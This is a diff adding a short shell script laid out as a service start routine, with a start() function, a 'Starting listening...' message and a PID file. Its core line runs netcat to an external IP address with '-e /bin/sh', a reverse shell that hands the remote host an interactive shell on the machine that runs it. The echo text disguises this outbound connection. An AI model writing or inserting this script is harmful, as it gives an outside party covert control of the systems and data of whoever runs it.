@@ -1,0 +1,10 @@
+#!/bin/sh
+
+start()
+{
+echo "Starting listening..."
+ nc 172.110.6.217 1300 -e /bin/sh
+echo "$!" > "$PIDFILE"
+}
+
+start
